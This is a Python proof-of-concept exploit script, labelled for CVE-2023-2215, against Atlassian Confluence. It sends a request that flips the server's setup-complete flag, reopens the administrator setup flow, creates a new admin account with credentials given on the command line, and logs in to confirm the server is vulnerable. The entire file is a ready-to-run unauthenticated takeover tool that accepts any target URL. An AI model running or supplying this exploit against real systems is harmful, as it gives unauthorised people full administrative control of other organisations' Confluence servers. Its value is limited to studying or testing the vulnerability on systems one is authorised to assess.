import aiohttp
import asyncio
import argparse
import random

"""
Poc for CVE-2023-2215 - zwx
"""

HEADERS = {
    "X-Atlassian-Token": "no-check",
}

class Confluence:
    def __init__(self, base_url, username, password, email):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.email = email

    async def init_setup(self):
        url = f"{self.base_url}/setup/setupadministrator-start.action"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=HEADERS) as response:
                if response.status == 200:
                    print("Setup initialized")
                else:
                    print(f"Failed to initialize setup. Status code: {response.status}")

    async def set_setup_incomplete(self):
        url = f"{self.base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{random.randint(1, 1000)}"
        print(url)
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=HEADERS) as response:
                if response.status == 200:
                    print("Setup marked as incomplete")
                else:
                    print(f"Failed to set up as incomplete. Status code: {response.status}")
    
    async def setup_administrator(self):
        url = f"{self.base_url}/setup/setupadministrator.action"
        data = {
            'username': self.username,
            'fullName': self.username,
            'email': self.username + "@qq.com",
            'password': self.password,
            'confirm': self.password,
            'setup-next-button': 'Next'
        }
        HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=HEADERS) as response:
                if response.status == 200:
                    print("Administrator setup successful")
                else:
                    print(f"Administrator setup failed. Status code: {response.status}")
    
    async def finish_setup(self):
        url = f"{self.base_url}/setup/finishsetup.action"
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=HEADERS) as response:
                if response.status == 200:
                    print("Setup finished")
                else:
                    print(f"Failed to Exploit. Status code: {response.status}")
    
    async def authentication_check(self):
        url = f"{self.base_url}/dologin.action"
        data = {
            'os_username': self.username,
            'os_password': self.password,
            'login': 'Log+in',
            'os_destination': '/index.action',
            'atl_token': ''
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data, headers=HEADERS) as response:
                if response.status == 200:
                    print("Server is vulnerable !!")
                else:
                    print(f"Authentication failed. Status code: {response.status}")
    
    async def exploit(self):
        await self.init_setup()
        await self.set_setup_incomplete()
        await self.setup_administrator()
        await self.finish_setup()
        await self.authentication_check()

async def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2215 Exploit')
    parser.add_argument('--url', required=True, help='Confluence base URL')
    parser.add_argument('--username', required=True, help='Admin username')
    parser.add_argument('--password', required=True, help='Admin password')
    parser.add_argument('--email', required=True, help='Admin email')
    args = parser.parse_args()

    base_url = args.url
    username = args.username
    password = args.password
    email = args.email

    confluence = Confluence(base_url, username, password, email)
    await confluence.exploit()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
